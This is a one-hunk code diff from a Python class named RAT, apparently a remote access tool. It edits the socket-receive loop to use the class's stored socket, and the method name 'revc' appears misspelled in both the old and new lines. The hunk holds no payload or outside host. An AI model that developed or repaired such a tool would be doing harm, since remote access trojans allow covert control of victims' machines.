@@ -158,7 +158,7 @@ class RAT:
 			if(data):
 				break
 			else:
-				pkt = sock.revc(cls.BUFFER)
+				pkt = cls._sock.revc(cls.BUFFER)
 		return data
 
 	# bind connection
